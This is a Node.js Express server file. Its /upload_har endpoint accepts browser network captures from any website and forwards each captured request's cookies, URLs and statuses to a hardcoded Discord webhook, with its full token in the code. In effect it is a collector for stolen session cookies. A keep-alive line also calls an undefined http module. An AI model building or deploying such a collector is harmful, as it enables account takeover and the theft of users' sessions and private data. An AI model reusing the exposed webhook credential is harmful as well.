// server.js
const express = require('express');
const bodyParser = require('body-parser');
const https = require('https');
const url = require('url');
const app = express();
const PORT = process.env.PORT || 8080;
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1518161581693730938/Yv8Vj3IkW4aKRH7HQG5-1EnsaxAm_R4LaIF956e_ysgO0WfvpxmFfv5NSAB16PaZYw2r";

app.use(bodyParser.json({ limit: '50mb' }));
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Content-Type, X-HAR-Timestamp, X-Target-URL, Authorization');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

app.get('/', (req, res) => {
    res.send('Online. Uptime: ' + process.uptime().toFixed(0) + 's');
});

app.post('/upload_har', (req, res) => {
    const webhookUrl = url.parse(DISCORD_WEBHOOK_URL);
    const harData = req.body;
    const targetUrl = req.headers['x-target-url'] || 'unknown';
    const timestamp = req.headers['x-har-timestamp'] || new Date().toISOString();
    const entries = harData?.log?.entries || [];
    
    const embeds = [{
        title: "HAR Capture - " + targetUrl,
        color: 0x00ff00,
        timestamp: timestamp,
        fields: [
            { name: "Target", value: targetUrl, inline: false },
            { name: "Requests Captured", value: String(entries.length), inline: true },
            { name: "Size", value: (JSON.stringify(harData).length / 1024).toFixed(2) + " KB", inline: true }
        ]
    }];
    
    entries.slice(0, 8).forEach((entry, i) => {
        embeds.push({
            title: entry.request?.method + " " + (entry.request?.url || "").substring(0, 200),
            color: entry.response?.status >= 400 ? 0xff0000 : 0x3498db,
            fields: [
                { name: "Status", value: String(entry.response?.status || "N/A"), inline: true },
                { name: "Cookies", value: (entry.request?.cookies || []).map(c => c.name + "=" + c.value).join("\n").substring(0, 900) || "None", inline: false }
            ]
        });
    });
    
    const postData = JSON.stringify({ content: "New capture from " + targetUrl, embeds: embeds });
    const req2 = https.request({
        hostname: webhookUrl.hostname,
        path: webhookUrl.path,
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Content-Length': postData.length }
    }, (resp) => {});
    req2.write(postData);
    req2.end();
    
    res.status(200).json({ success: true });
});

setInterval(() => { try { http.get('http://localhost:' + PORT + '/', (r) => {}); } catch(e) {} }, 240000);

app.listen(PORT, () => console.log('Server running on port ' + PORT));